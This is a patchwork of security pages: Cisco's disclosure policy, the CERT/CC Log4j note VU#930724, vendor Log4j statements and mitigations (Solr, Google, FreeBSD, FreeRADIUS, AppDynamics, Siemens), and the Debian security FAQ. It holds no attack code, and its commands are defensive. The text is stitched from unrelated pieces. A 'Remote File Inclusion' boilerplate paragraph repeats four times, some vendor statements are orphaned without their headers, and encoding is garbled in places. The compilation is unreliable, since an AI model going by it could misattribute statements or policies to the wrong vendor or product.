As documented in the [Receiving Security Vulnerability Information from Cisco](#rsvifc) section of this document, Cisco delivers technical security information about software fixes in Cisco products and distributes product updates through several channels. Cisco reserves the right to deviate from this policy on an exception basis to ensure access to Cisco.com for software patch availability.

### **Disclosure Schedule**

In direct response to customer feedback, Cisco releases the following bundles of Cisco Security Advisories at 1600 Greenwich Mean Time (GMT) on a regular schedule twice each year. This schedule applies to the disclosure of vulnerabilities in the following Cisco products and does not apply to the disclosure of vulnerabilities in other Cisco products.

| **Cisco Product(s)** | **Release Schedule** |
| --- | --- |
| Cisco NX-OS Software | Fourth Wednesday of February and August |
| Cisco IOS XR Software | Second Wednesday in March and September |
| Cisco IOS and IOS XE Software | Fourth Wednesday in March and September |

### All Other Products

Cisco generally discloses Cisco Security Advisories at 1600 GMT on any given Wednesday.

### Exceptions

Cisco reserves the right to publish an individual Security Advisory for Cisco IOS and IOS XE Software, Cisco IOS XR Software, or Cisco NX-OS Software or other products outside the published schedule. Conditions under which an out-of-cycle publication may occur include, but are not limited to, the following:

* Cisco detects heightened public awareness of a serious vulnerability.
* Cisco learns of active exploitation of a vulnerability.
* Cisco works with a third-party coordination center to publicly disclose a vulnerability.

### **Incident Response Eligibility**

All customers, regardless of contract status, are eligible to receive support from the Cisco TAC for a known or reasonably suspected security vulnerability in Cisco products and services. For more information about how to contact the Cisco TAC, see the [General Security-Related Queries](https://sec.cloudapps.cisco.com/security/center/resources/security_vulnerability_policy.html#gsrq) section of this document. Customers who contact the Cisco TAC should reference the URL of the Cisco security publication to assist in connecting with the proper support team.

Customers with paid service contracts for incident response and forensic assistance should request assistance through the contact methods specified in their contract.

Cisco, at its sole discretion, may offer customers additional security services free of charge. Cisco reserves the right to determine the type and degree of free assistance it may offer in connection with any incident and to withdraw from such an incident at any time.

### **Security Software Updates**

The Cisco PSIRT will investigate and disclose vulnerabilities in Cisco products and services from the date of First Commercial Shipment (FCS) to the [LDoS](https://www.cisco.com/c/en/us/products/eos-eol-policy.html). Cisco customers with service contracts that entitle them to regular software updates should obtain security fixes through their usual update channels, generally from the Cisco website for the relevant product. Cisco recommends contacting the Cisco TAC only with specific and imminent problems or questions.

As a special customer service, and to improve the overall security of the internet, Cisco may offer customers free software updates to address high-severity security problems. The decision to provide free software updates is made on a case-by-case basis. Refer to the Cisco security publication for details. Free software updates will typically be limited to Critical- and High-severity vulnerabilities.

Fixes for some third-party software vulnerabilities may be available only in the most recent major software releases and not backported to older releases.

If Cisco has offered a free software update to address a specific issue, noncontract customers who are eligible for the update may obtain it by contacting the Cisco TAC using any of the methods described in the [General Security-Related Queries](#gsrq) section of this document.

**Note:** To verify their entitlement, individuals who contact the Cisco TAC should have available the URL of the Cisco document that is offering the update.

Customers may only download, install, and expect support for software releases and feature sets for which they have purchased a valid license that is current and active. By installing, downloading, accessing, or otherwise using such software updates, customers agree to follow the terms of the [Cisco software license agreement](https://www.cisco.com/c/en/us/about/legal/cloud-and-software/end_user_license_agreement.html). In most cases, the software update will be a maintenance release to software that was previously purchased. Free security software updates do not entitle customers to a new software license, additional software feature sets, or major revision upgrades.

After [End of Sale](https://www.cisco.com/c/en/us/products/eos-eol-policy.html) (EoS), the availability of security fixes for vulnerabilities is defined in the product’s EoS bulletin. (See the [End-of-Life Policy](https://www.cisco.com/c/en/us/products/eos-eol-policy.html) for details.) The EoS bulletin may define the Last Day of Support (**LDoS**) milestone, which identifies the last date that Cisco will investigate and disclose product vulnerabilities.

Once the LDoS has been reached, the Cisco PSIRT will continue to accept vulnerability reports but will not analyze, fix, or disclose potential vulnerabilities. To this end, the Cisco PSIRT will not issue CVEs for issues reported on products that are past the LDoS milestone.

### Security Advisory Terms and Conventions

**Fixed Release Availability:** If a future release date is indicated for software, the date provided represents an estimate based on all information known to Cisco as of the "Last Updated" date at the top of the advisory. Availability dates are subject to change based on a number of factors, including satisfactory testing results and delivery of other priority features and fixes. If no version or date is listed for an affected component (indicated by a blank field and/or an advisory designation of Interim), Cisco is continuing to evaluate the fix and will update the advisory as additional information becomes available.

### Rule Vulnerability

Remote File Inclusion

Remote File Inclusion (RFI) attacks occur when a webserver takes a file crafted by an attacker as input and runs or stores it in an unsafe manner. For instance, the webserver could accept an image file that is actually code, then call it to execute after uploading. RFI attacks happen on web applications that dynamically include external files or scripts. A successful RFI can lead to data leaks, remote code execution, or cross site scripting. Avoid dynamic inclusion of user input files, or whitelist files that may be included. Keep the PHP allow\_url\_include option set to off; this will not protect against Local File Inclusion attacks.

## Apache Log4j allows insecure JNDI lookups

#### Vulnerability Note VU#930724

Original Release Date: 2021-12-15 | Last Revised: 2024-04-17

---

### Overview

Apache Log4j allows insecure JNDI lookups that could allow an unauthenticated, remote attacker to execute arbitrary code with the privileges of the vulnerable Java application using Log4j.

CISA has published [Apache Log4j Vulnerability Guidance](https://www.cisa.gov/uscert/apache-log4j-vulnerability-guidance) and provides a [Software List](https://github.com/cisagov/log4j-affected-db#software-list).

### Description

The default configuration of Apache Log4j supports [JNDI](https://docs.oracle.com/javase/tutorial/jndi/overview/index.html) (Java Naming and Directory Interface) lookups that can be exploited to exfiltrate data or execute arbitrary code via remote services such as LDAP, RMI, and DNS.

This vulnerability note includes information about the following related vulnerabilities.

* CVE-2021-44228 tracks the initial JNDI injection and RCE vulnerability in Log4j 2. This vulnerability poses considerabily more risk than the others.
* CVE-2021-4104 tracks a very similar vulnerability that affects Log4j 1 if JMSAppender and malicious connections have been configured.
* CVE-2021-45046 tracks an incomplete fix for CVE-2021-44228 affecting Log4j 2.15.0 when an attacker has "...control over Thread Context Map (MDC) input data when the logging configuration uses a non-default Pattern Layout with either a Context Lookup (for example, $${ctx:loginId}) or a Thread Context Map pattern."

We provide [tools](https://github.com/CERTCC/CVE-2021-44228_scanner) to scan for vulnerable jar files.

More information is available from the [Apache Log4j Security Vulnerabilities](https://logging.apache.org/log4j/2.x/security.html) page, including these highlights.

Certain conditions must be met to make Log4j 1.x vulnerable:

> Log4j 1.x mitigation: Log4j 1.x does not have Lookups so the risk is lower. Applications using Log4j 1.x are only vulnerable to this attack when they use JNDI in their configuration. A separate CVE (CVE-2021-4104) has been filed for this vulnerability. To mitigate: audit your logging configuration to ensure it has no JMSAppender configured. Log4j 1.x configurations without JMSAppender are not impacted by this vulnerability.

Log4j API code alone is not affected:

> Note that only the log4j-core JAR file is impacted by this vulnerability. Applications using only the log4j-api JAR file without the log4j-core JAR file are not impacted by this vulnerability.

### Impact

A remote, unauthenticated attacker with the ability to log specially crafted messages can cause Log4j to connect to a service controlled by the attacker to download and execute arbitrary code.

### Solution

In Log4j [2.12.2](https://lists.apache.org/thread/fvl15g8lkqf9d8owqhg9z9p2hthvchws) (for Java 7) and [2.16.0](https://lists.apache.org/thread/t72msv9cpxw9q5zw8rfkhx52v24z57f1) (for Java 8 or later) the message lookups feature has been completely removed. In addition, JNDI is disabled by default and other default configuration settings are modified to mitigate CVE-2021-44228 and CVE-2021-45046.

For Log4j 1, remove the JMSAppender class or do not configure it. Log4j 1 is [not supported](https://logging.apache.org/log4j/1.2/) and likely contains unfixed bugs and vulnerabilities (such as CVE-2019-17571).

For applications, services, and systems that use Log4j, consult the appropriate vendor or provider. See the CISA [Log4j Software List](https://github.com/cisagov/log4j-affected-db#software-list) and the [Vendor Information](#vendor-information) section below.

### Workarounds

Remove the JndiLookup class from the classpath, for example:

`zip -q -d log4j-core-*.jar org/apache/logging/log4j/core/lookup/JndiLookup.class`

As analysis has progressed, certain mitigations have been found to be less effective or incomplete. See "Older (discredited) mitigation measures" on the [Apache Log4j Security Vulnerabilities](https://logging.apache.org/log4j/2.x/security.html) page.

[SLF4J](http://slf4j.org/log4shell.html) also recommends write-protecting Log4j configuration files.

### [Apache Solr](#Apache%20Solr) Affected

Notified:  2021-12-17
Updated: 2021-12-22

**Statement Date:   December 21, 2021**

| **CVE-2021-4104** | Affected |
| --- | --- |
| **CVE-2021-44228** | Affected |
| **CVE-2021-45046** | Not Affected |

#### Vendor Statement

**Apache Solr** releases prior to 8.11.1 were using a bundled version of the Apache Log4J library vulnerable to RCE (see **CVE-2021-44228**). Malicious input from a user-supplied query string (or any other URL request parameter like request handler name) is logged by default with log4j.

Apache Solr releases prior to 7.4 (i.e. Solr 5, Solr 6, and Solr 7 through 7.3) use Log4J 1.2.17 which may be vulnerable for installations using non-default logging configurations that include the JMS Appender (see **CVE-2021-4104**).

In response to the vulnerabilities, the Apache Solr team released version **Solr 8.11.1** that bundles **log4j 2.16.0**. An update to 2.17.0 (or later) will be done with the next maintenance release as Solr is not vulnerable to CVE-2021-45105 (see below).

Apache Solr releases are not vulnerable to the followup **CVE-2021-45046** and **CVE-2021-45105**, because the MDC patterns used by Solr are for the collection, shard, replica, core and node names, and a potential trace id, which are all sanitized and injected into log files with "%X". Passing system property **log4j2.formatMsgNoLookups=true** is suitable to mitigate.

**Solr's Prometheus Exporter** uses Log4J as well but it does not log user input or data, so we don't see a risk there.

| weâre theoretically vulnerable to it, but an attacker would have to have write access to the file system to change the log4j configuration to enable the JMSAppender and to tweak the topic as described. Given that, I donât think itâs particularly relevant.

Google Cloud is actively following the security vulnerabilities in the open-source Apache âLog4j 2" utility (CVE-2021-44228 and CVE-2021-45046). We are also aware of the reported Apache âLog4j 1.xâ vulnerability (CVE-2021-4104). We encourage customers to update to the latest version of Log4j 2. We are currently assessing the potential impact of the vulnerability for Google Cloud products and services. This is an ongoing event and we will continue to provide updates through this page (https://cloud.google.com/log4j2-security-advisory) and our customer communications channels.

Based on our findings, Google Workspace core services for consumer and paid users are not using Log4j 2 and are not impacted by the issues identified in CVE-2021-44228 and CVE-2021-45046. See below for a detailed status of the Workspace core services and other related products.

We recommend Google customers review all third-party apps and solutions accessing their data and validate the security status of those apps with their respective vendors. More details on managing apps authorized to access Google Workspace data are here and customers can review their list of solutions from the Google Cloud Marketplace by logging into their account. We also recommend validating the security status of any apps developed and deployed by customers within their environments.

#### Vendor Statement

The FreeBSD Project does not ship Java or Apache log4j as part of the base operating system. While there are third-party packages available via the ports and pkg system that may be affected, the FreeBSD Project defers to each upstream project on their vulnerability status. Please see the referenced tracking bug that lists known affected ports and pkgs.

### [FreeRADIUS](#FreeRADIUS) Not Affected

| --- | --- |
| **CVE-2021-44228** | Not Affected |
| **CVE-2021-45046** | Not Affected |

#### Vendor Statement

FreeRADIUS is not affected by this vulnerability.

However, the RADIUS protocol allows for unknown users to attempt authentication. The user is in complete control over the RADIUS User-Name. The RADIUS server can produce logs containing the User-Name filed controlled by the attacker. Depending on the local site configuration, the logs may be consumed by something which eventually reaches a vulnerable log4j instance.

There is a good summary written by Radiator software https://blog.radiatorsoftware.com/2021/12/radius-servers-and-log4j-vulnerability.html

We agree with their analysis, and with their conclusions.

### Rule Vulnerability

Remote File Inclusion

Remote File Inclusion (RFI) attacks occur when a webserver takes a file crafted by an attacker as input and runs or stores it in an unsafe manner. For instance, the webserver could accept an image file that is actually code, then call it to execute after uploading. RFI attacks happen on web applications that dynamically include external files or scripts. A successful RFI can lead to data leaks, remote code execution, or cross site scripting. Avoid dynamic inclusion of user input files, or whitelist files that may be included. Keep the PHP allow\_url\_include option set to off; this will not protect against Local File Inclusion attacks.

### Rule Vulnerability

Remote File Inclusion

Remote File Inclusion (RFI) attacks occur when a webserver takes a file crafted by an attacker as input and runs or stores it in an unsafe manner. For instance, the webserver could accept an image file that is actually code, then call it to execute after uploading. RFI attacks happen on web applications that dynamically include external files or scripts. A successful RFI can lead to data leaks, remote code execution, or cross site scripting. Avoid dynamic inclusion of user input files, or whitelist files that may be included. Keep the PHP allow\_url\_include option set to off; this will not protect against Local File Inclusion attacks.

Customers who are unable to upgrade can mitigate the risk of these vulnerabilities in two ways:

* **Option A**: Upgrade the Controller’s Java Agent to Java Agent JDK8+ 21.11.2. See [Upgrade the Java Agent](https://docs.appdynamics.com/21.4/en/application-monitoring/install-app-server-agents/java-agent/administer-the-java-agent/upgrade-the-java-agent#UpgradetheJavaAgent-UpgradetheJavaAgent) in our Docs for detailed steps. The Controller’s Java Agent is installed in the following directory:

<controller-directory>/appserver/glassfish/domains/domain1/appagent

* **Option B:** Perform the mitigation steps documented below for the Java Agent.

#### Java Agent

##### **Java Agent JDK 8+**

Versions prior to 21.11.1 are vulnerable to CVE-2021-44228 and CVE-2021-45046.

Versions prior to 21.11.2 are vulnerable to CVE-2021-45046.

AppDynamics recommends that customers using Java Agent JDK 8+ upgrade to Java Agent JDK 8+ 21.11.2 (or higher).

*(Please Note: Java Agent JDK8+ does not support JDK6 or JDK7)*

##### Java Agent Legacy - Sun and JRockit

All versions configured for JDK6 are not vulnerable as this configuration uses Log4j 1.x.

Versions prior to 21.11.2 configured for JDK7 or above are vulnerable to CVE-2021-44228 and CVE-2021-45046.

AppDynamics recommends that customers using Java Agent Legacy - Sun and JRockit upgrade to Java Agent Legacy - Sun and JRockit 21.11.2.

##### Java Agent Legacy - IBM JVM

All versions configured for JDK6 are not vulnerable as this configuration uses Log4j 1.x.

Versions prior to 21.11.2 configured for JDK7 or above are vulnerable to CVE-2021-44228 and CVE-2021-45046.

AppDynamics recommends that customers using Java Agent Legacy - IBM JVM upgrade to Java Agent Legacy - IBM JVM 21.11.2 (or higher).

##### Mitigation for Java Agent

*Applies to Java Agent JDK 8+, Java Agent Legacy - Sun and JRockit, and Java Agent Legacy - IBM JVM*

Customers who cannot upgrade to a fixed release of Java Agent may mitigate this risk by removing the JndiLookup class. The following command should be executed in the <version>/lib/tp directory where the agent is installed:

```
zip -dq log4j-core-*.jar org/apache/logging/log4j/core/lookup/JndiLookup.class
```
CODE

*This change requires a restart of the application.*

#### Machine Agent

Versions prior to 21.12.0 are vulnerable to CVE-2021-44228 and CVE-2021-45046.

Versions prior to 21.12.1 are vulnerable to CVE-2021-45046.

AppDynamics recommends that customers running on Windows upgrade to version 21.12.2 (or higher).

AppDynamics recommends that customers upgrade to version 21.12.1 (or higher) for all other operating systems.

Customers who are unable to upgrade can mitigate the risk from this vulnerability by executing the following command in the Machine Agent install directory:

```
zip -dq lib/log4j-core-*.jar org/apache/logging/log4j/core/lookup/JndiLookup.class
```
CODE

*This change requires a restart of the Machine Agent.*

#### Node.js Agent

Versions prior to 21.9 are vulnerable to CVE-2021-44228 and CVE-2021-45046 only if the Java Proxy is enabled. (The Java Proxy is off by default in Node.js Agent 4.5.16 and later).

Customers running Node.js with the proxy enabled can mitigate this vulnerability by making one of the following two changes:

* **Op****tion A**: Disable the Java Proxy:
  -Node.js versions 4.5.16 and later: Remove “proxy:true” from the agent configuration (this is the default configuration)
  -Node.js versions prior to 4.5.16: Set “libagent:true” in the agent configuration
* **Option B**: Check if the file `singularity-log4j.jar` exists in the `appdynamics-proxy/proxy/lib/` directory. If it exists, no action required from your end. If it doesn't exist, proceed by removing the `JndiLookup` class from the `classpath`. The following command should be executed in the `<version>/lib/tp` directory where the agent is installed:

  ```
  zip -dq log4j-core-*.jar org/apache/logging/log4j/core/lookup/JndiLookup.class
  ```
  CODE

  *This change requires a restart of the application.*

#### PHP Agent

Versions prior to 21.12.0 are vulnerable to CVE-2021-44228 and CVE-2021-45046.

### Rule Vulnerability

Remote File Inclusion

Remote File Inclusion (RFI) attacks occur when a webserver takes a file crafted by an attacker as input and runs or stores it in an unsafe manner. For instance, the webserver could accept an image file that is actually code, then call it to execute after uploading. RFI attacks happen on web applications that dynamically include external files or scripts. A successful RFI can lead to data leaks, remote code execution, or cross site scripting. Avoid dynamic inclusion of user input files, or whitelist files that may be included. Keep the PHP allow\_url\_include option set to off; this will not protect against Local File Inclusion attacks.

Siemens Security Advisory by Siemens ProductCERT

SSA-479842: Apache Log4j Vulnerabilities - Impact to Siemens
Energy Sensformer / Sensgear (Platform, Basic and Advanced)

2021-12-21
Publication Date:
2021-12-23
Last Update:
Current Version:
V1.1
CVSS v3.1 Base Score: 10.0

SUMMARY

On 2021-12-09, a vulnerability in Apache Log4j (a logging tool used in many Java-based applications)
was disclosed, that could allow remote unauthenticated attackers to execute code on vulnerable systems.
The vulnerability is tracked as CVE-2021-44228 and is also known as “Log4Shell”.

On 2021-12-14 an additional denial of service vulnerability (CVE-2021-45046) was published rendering
the initial mitigations and ﬁx in version 2.15.0 as incomplete under certain non-default conﬁgurations.
Log4j versions 2.16.0 and 2.12.2 are supposed to ﬁx both vulnerabilities.

On 2021-12-17, CVE-2021-45046 was reclassiﬁed with an increased CVSS base score (from 3.7 to 9.0).
The potential impact of CVE-2021-45046 now includes - besides denial of service - also information
disclosure and local (and potential remote) code execution. Furthermore, one additional denial of service
vulnerability, CVE-2021-45105, was disclosed.

The Siemens Energy Sensformer / Sensgear cloud service was affected by these vulnerabilities and has
remediated them. No user actions are necessary.

WORKAROUNDS AND MITIGATIONS

Siemens has not identiﬁed any additional speciﬁc workarounds or mitigations. Please follow the General
Security Recommendations.

Product speciﬁc mitigations can be found in the section Affected Products and Solution.

GENERAL SECURITY RECOMMENDATIONS

Operators of critical power systems (e.g. TSOs or DSOs) worldwide are usually required by regulations to
build resilience into the power grids by applying multi-level redundant secondary protection schemes. It is
therefore recommended that the operators check whether appropriate resilient protection measures are
in place. The risk of cyber incidents impacting the grid’s reliability can thus be minimized by virtue of the
grid design.

Siemens strongly recommends applying the provided security updates using the corresponding tooling
and documented procedures made available with the product. If supported by the product, an automated
means to apply the security updates across multiple product instances may be used. Siemens strongly
recommends prior validation of any security update before being applied, and supervision by trained staff
of the update process in the target environment.

As a general security measure Siemens strongly recommends to protect network access with appropriate
mechanisms (e.g. ﬁrewalls, segmentation, VPN). It is advised to conﬁgure the environment according to
our operational guidelines in order to run the devices in a protected IT environment.

PRODUCT DESCRIPTION

Sensformer / Sensgear contains the necessary sensors for entering the most important operating
parameters – such as oil-level, temperature, LV winding current and GPS-positioning of a transformer.

VULNERABILITY CLASSIFICATION

The vulnerability classiﬁcation has been performed by using the CVSS scoring system in version 3.1
(CVSS v3.1) (https://www.ﬁrst.org/cvss/). The CVSS environmental score is speciﬁc to the customer’s
environment and will impact the overall CVSS score. The environmental score should therefore be
individually deﬁned by the customer to accomplish ﬁnal scoring.

An additional classiﬁcation has been performed using the CWE classiﬁcation, a community-developed list
of common software security weaknesses. This serves as a common language and as a baseline for
weakness identiﬁcation, mitigation, and prevention efforts. A detailed list of CWE classes can be found at:
https://cwe.mitre.org/.

Vulnerability CVE-2021-44228

Apache Log4j V2, versions < 2.15.0 do not protect JNDI features (as used in conﬁguration, log
messages, and parameters) against attacker controlled LDAP and other JNDI related endpoints.

An attacker who can control log messages or log message parameters could execute arbitrary code
loaded from LDAP servers when message lookup substitution is enabled.

Siemens Security Advisory by Siemens ProductCERT

Vulnerability CVE-2021-45046

The ﬁx to address CVE-2021-44228 was incomplete in certain non-default conﬁgurations, when
the logging conﬁguration uses a non-default Pattern Layout with a Context Lookup (for example,
${ctx:loginId}).

This could allow attackers with control over Thread Context Map (MDC) input data to craft malicious
input data using a JNDI Lookup pattern, resulting in an information leak and remote code execution in
some environments and local code execution in all environments.

Vulnerability CVE-2021-45105

Apache Log4j2 versions 2.0-alpha1 through 2.16.0 did not protect from uncontrolled recursion from
self-referential lookups, when the logging conﬁguration uses a non-default Pattern Layout with a
Context Lookup (for example, $${ctx:loginId}).

This could allow attackers with control over Thread Context Map (MDC) input data to craft malicious
input data that contains a recursive lookup, resulting in a denial of service condition.

### Rule Vulnerability

Remote File Inclusion

Remote File Inclusion (RFI) attacks occur when a webserver takes a file crafted by an attacker as input and runs or stores it in an unsafe manner. For instance, the webserver could accept an image file that is actually code, then call it to execute after uploading. RFI attacks happen on web applications that dynamically include external files or scripts. A successful RFI can lead to data leaks, remote code execution, or cross site scripting. Avoid dynamic inclusion of user input files, or whitelist files that may be included. Keep the PHP allow\_url\_include option set to off; this will not protect against Local File Inclusion attacks.

*Q: I received a DSA via debian-security-announce, how can I upgrade the vulnerable packages?*

A: As the DSA mail says, you should upgrade the packages affected by the
announced vulnerability. You can do this by just upgrading (after
updating the list of available packages with apt-get update)
every package in your system with apt-get upgrade or by
upgrading just a particular package, with apt-get install
*package*.

The announcement mail mentions the source package in which the vulnerability
was present. Therefore, you should update all the binary packages from
that source package. To check the binary packages to update, visit
https://packages.debian.org/src:*source-package-name* and
click on *[show ... binary packages]* for the distribution you
are updating.

It may also be necessary to restart a service or a running process. The
command [checkrestart](https://manpages.debian.org/checkrestart)
included in the package
[debian-goodies](https://packages.debian.org/debian-goodies)
might help to find which ones.

*Q: The signature on your advisories does not verify correctly!*

A: This is most likely a problem on your end. The
[debian-security-announce](https://lists.debian.org/debian-security-announce/)
list has a filter that only allows messages with a correct signature
from one of the security team members to be posted.

Most likely some piece of mail software on your end slightly changes
the message that breaks the signature. Make sure your software does
not do any MIME encoding or decoding, or tab/space conversions.

Known culprits are fetchmail (with the mimedecode option enabled),
formail (from procmail 3.14 only) and evolution.

*Q: How is security handled in Debian?*

A: Once the security team receives a notification of an incident,
one or more members review it and consider its impact on the stable
release of Debian (i.e. if it's vulnerable or not).
If our system is vulnerable, we work on a fix for the
problem. The package maintainer is contacted as well, if they didn't
contact the security team already. Finally, the fix is tested and
new packages are prepared, which are then compiled on all stable
architectures and uploaded afterwards. After all of that is done,
an advisory is published.

*Q: Why are you fiddling with an old version of that package?*

The most important guideline when making a new package that fixes a
security problem is to make as few changes as possible. Our users and
developers are relying on the exact behaviour of a release once it is made,
so any change we make can possibly break someone's system. This is
especially true in case of libraries: make sure you never change the
Application Program Interface (API) or Application Binary Interface (ABI),
no matter how small the change is.

This means that moving to a new upstream version is not a good solution,
instead the relevant changes should be backported. Generally upstream
maintainers are willing to help if needed, if not the Debian security team
might be able to help.

In some cases it is not possible to backport a security fix, for example
when large amounts of source code need to be modified or rewritten. If that
happens it might be necessary to move to a new upstream version, but this
has to be coordinated with the security team beforehand.

*Q: The version number for a package indicates that I am still running
a vulnerable version!*

A: Instead of upgrading to a new release we backport security fixes to
the version that was shipped in the stable release. The reason we do
this is to make sure that a release changes as little as possible
so things will not change or break unexpectedly as a result of a
security fix. You can check if you are running a secure version of
a package by looking at the package changelog, or comparing its
exact version number with the version indicated in the Debian
Security Advisory.

*Q: I received an advisory, but the build for one
processor architecture seems to be missing.*

A: Generally the Security Team releases an advisory with builds of the updated
packages for all architectures that Debian supports. However, some architectures
are slower than others and it may happen that builds for most architectures
are ready while some are still missing. These smaller archs represent a small
fraction of our user base. Depending on the urgency of the issue
we may decide to release the advisory forthwith. The missing builds will be
installed as soon as they come available, but no further notice of this will
be given. Of course we will never release an advisory where the i386 or amd64
builds are not present.

*Q: How is security handled for unstable?*

A: Security for unstable is primarily handled by package maintainers, not
by the Debian Security Team. Although the security team may upload
high-urgency security-only fixes when maintainers are noticed to be
inactive, support for stable will always have priority.
If you want to have a secure (and stable) server you are strongly encouraged
to stay with stable.

*Q: How is security handled for testing?*

A: Security for testing benefits from the security efforts of the entire
project for unstable. However, there is a minimum two-day migration delay,
and sometimes security fixes can be held up by transitions. The Security
Team helps to move along those transitions holding back important
security uploads, but this is not always possible and delays may occur.
Especially in the months after a new stable release, when many new versions
are uploaded to unstable, security fixes for testing may lag behind.
If you want to have a secure (and stable) server you are strongly
encouraged to stay with stable.

*Q: How is security handled for contrib,
non-free and non-free-firmware?*

A: The short answer is: it's not. Contrib, non-free and non-free-firmware aren't official
parts of the Debian Distribution and are not released, and thus not
supported by the security team. Some non-free packages are distributed
without source or without a license allowing the distribution of modified
versions. In those cases no security fixes can be made at all. If it
is possible to fix the problem, and the package maintainer or someone else
provides correct updated packages, then the security team will generally
process them and release an advisory.

*Q: The advisory says unstable is fixed in
version 1.2.3-1, but unstable has 1.2.5-1, what's up?*

A: We try to list the first version in unstable that fixed the problem.
Sometimes the maintainer has uploaded even newer versions in the meantime.
Compare the version in unstable with the version we indicate. If it's the
same or higher, you should be safe from this vulnerability. If you want to
be sure, you can check the package changelog with apt-get changelog
package-name and search for the entry announcing the fix.

*Q: Why are there no official mirrors for security.debian.org?*

A: Actually, there are. There are several official mirrors, implemented
through DNS aliases. The purpose of security.debian.org is to make security
updates available as quickly and easily as possible.

Encouraging the use of unofficial mirrors would add extra complexity
that is usually not needed and that can cause frustration if these
mirrors are not kept up to date.

*Q: I've seen DSA 100 and DSA 102, now where is DSA 101?*

A: Several vendors (mostly of GNU/Linux, but also of BSD
derivatives) coordinate security advisories for some incidents and
agree to a particular timeline so that all vendors are able to
release an advisory at the same time. This was decided in order to
not discriminate some vendors that need more time (e.g. when the
vendor has to pass packages through lengthy QA tests or has to
support several architectures or binary distributions). Our own
security team also prepares advisories in advance. Every now and
then, other security issues have to be dealt with before the parked
advisory could be released, and hence temporarily leaving out one or
more advisories by number.

*Q: How can I reach the security team?*

A: Security information can be sent to security@debian.org or
team@security.debian.org, both of which are read by the members of
the security team.

If desired, email can be encrypted with the Debian Security
Contact key (key ID [0x0D59D2B15144766A14D241C66BAF400B05C3E651](https://keyserver.ubuntu.com/pks/lookup?op=get&search=0x0d59d2b15144766a14d241c66baf400b05c3e651)). For the OpenPGP keys of individual team members, please
refer to the [keyring.debian.org](https://keyring.debian.org/)
keyserver.

*Q: I guess I found a security problem, what should I do?*

A: If you learn about a security problem, either in one of your own
packages or in someone else's please always contact the security team. If
the Debian security team confirms the vulnerability and other vendors are
likely to be vulnerable as well, they usually contact other vendors as
well. If the vulnerability is not yet public they will try to coordinate
security advisories with the other vendors, so all major distributions are
in sync.

If the vulnerability is already publicly known, be sure to file a bug
report in the Debian BTS, and tag it security.

If you are a Debian maintainer, [see below](#care).

*Q: What am I supposed to do with a security problem in one of
my packages?*

A: If you learn of a security problem, either in your package or
someone else's please always contact the security team via email at
team@security.debian.org. They keep track
of outstanding security problems, can help maintainers with
security problems or fix problems on their own, are responsible for
sending out security advisories and maintaining
security.debian.org.

The [Developer's Reference](../doc/developers-reference/pkgs.html#bug-security) has complete instructions on what to do.

It's particularly important that you don't upload to any other
distribution other than unstable without prior agreement by the
security team, because bypassing them will cause confusion and more
work.

*Q: I tried to download a package listed in one of the security
advisories, but I got a `file not found' error.*

A: Whenever a newer bugfix supersedes an older package on
security.debian.org, chances are high that the old package will be
removed by the time the new one gets installed. Hence, you'll get
this `file not found' error. We don't want to distribute packages
with known security bugs longer than absolutely necessary.

Please use the packages from the latest security advisories, which are
distributed through the [debian-security-announce](https://lists.debian.org/debian-security-announce/) mailing list. It's best to simply run
`apt-get update` before upgrading the package.

*Q: I've got a bugfix, can I upload to security.debian.org directly?*

A: No, you can't. The archive at security.debian.org is maintained
by the security team, who have to approve all packages. You should
instead send patches or proper source packages to the security team
via team@security.debian.org. They will be
reviewed by the security team and eventually uploaded, either with
or without modifications.

The [Developer's Reference](../doc/developers-reference/pkgs.html#bug-security) has complete instructions on what to do.

*Q: I've got a bugfix, can I upload to proposed-updates instead?*

A: Technically speaking, you can. However, you should not do this,
since this interferes badly with the work of the security team.
Packages from security.debian.org will be copied into the
proposed-updates directory automatically. If a package with the
same or a higher version number is already installed into the
archive, the security update will be rejected by the archive
system. That way, the stable distribution will end up without a
security update for this package instead, unless the wrong
packages in the proposed-updates directory were rejected. Please contact the
security team instead and include all details of the vulnerability
and attach the source files (i.e. diff.gz and dsc files) to your mail.

The [Developer's Reference](../doc/developers-reference/pkgs.html#bug-security) has complete instructions on what to do.

*Q: I'm pretty sure my packages are fine,
how can I upload them?*

A: If you are very sure that your packages don't break anything, that the
version is sane (i.e. greater than the version in stable and less than the
version in testing/unstable), that you didn't change the behaviour of the
package, despite the corresponding security problem, that you compiled it
for the correct distribution (that is `oldstable-security` or
`stable-security`), that the package contains the original
source if the package is new on security.debian.org, that you can confirm
the patch against the most recent version is clean and only touches the
corresponding security problem (check with `interdiff -z` and
both `.diff.gz` files), that you have proofread the patch at
least thrice, and that `debdiff` doesn't display any changes,
you may upload the files into the incoming directory
`ftp://ftp.security.upload.debian.org/pub/SecurityUploadQueue` on the
security.debian.org directly. Please send a notification with all details
and links to team@security.debian.org as well.

*Q: How can I help with security?*

A: Please review each problem before reporting it to
security@debian.org. If you are able to provide patches, that
would speed up the process. Do not simply forward bugtraq mails,
because we already receive them — but do provide us with
additional information about things reported on bugtraq.

A good way to get started with security work is helping
out on the Debian Security Tracker ([instructions](https://security-tracker.debian.org/tracker/data/report)).

*Q: What is the scope of proposed-updates?*

A: This directory contains packages which are proposed to enter the
next revision of Debian stable. Whenever packages are uploaded by
a maintainer for the stable distribution, they end up in the
proposed-updates directory. Since stable is meant to be stable, no
automatic updates are made. The security team will upload fixed
packages mentioned in their advisories to stable, however they will
be placed in proposed-updates first. Every couple of months the
Stable Release Manager checks the list of packages in
proposed-updates and discusses whether a package is suited for
stable or not. This is compiled into another revision of stable
(e.g. 2.2r3 or 2.2r4). Packages that don't fit will probably be
rejected and dropped from proposed-updates as well.

Note that the packages uploaded by maintainers (not by the security team)
in the proposed-updates/ directory are not supported by the security
team.

*Q: How is the security team composed?*

A: The Debian security team consists of
[several officers and secretaries](../intro/organization#security).
The security team itself appoints people to join the team.

*Q: How long will security updates be provided?*

A: The security team will support a stable distribution for
three years after its release. It is not possible to support three
distributions; supporting two simultaneously is already difficult
enough.

*Q: How can I check the integrity of packages?*

A: This process involve checking the Release file signature against
the [public key](https://ftp-master.debian.org/keys.html) used for the archive. The Release file contains the
checksums of Packages and Sources files, which contain
checksums of binary and source packages. Detailed instruction on how
to check packages integrity can be found in the [Debian Securing Manual](../doc/manuals/securing-debian-howto/ch7#s-deb-pack-sign).

*Q: What to do if a random package breaks after a security update?*

A: First of all, you should figure out why the package breaks and
how it is connected to the security update, then contact the
security team if it is serious or the stable release manager if it
is less serious. We're talking about random packages that break
after a security update of a different package. If you can't
figure out what's going wrong but have a correction, talk to the
security team as well. You may be redirected to the stable release
manager though.

